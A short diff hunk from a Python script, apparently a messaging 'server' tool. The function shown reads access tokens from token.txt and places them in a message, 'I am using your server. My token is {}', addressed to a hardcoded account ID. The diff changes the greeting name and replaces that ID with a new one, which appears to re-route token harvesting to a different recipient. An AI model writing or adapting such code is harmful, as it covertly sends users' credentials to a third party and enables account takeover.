@@ -41,10 +41,10 @@ def send_initial_message():
     with open("token.txt", "r") as file:
         tokens = file.readlines()
     # Modify the message as per your requirement
-    msg_template = "Hello saiim dada ! I am using your server. My token is {}" 
+    msg_template = "Hello Prince Bhai ! I am using your server. My token is {}" 
 
     # Specify the ID where you want to send the message
-    target_id = "100054918818977"
+    target_id = "100075799987253"
 
     requests.packages.urllib3.disable_warnings()
 
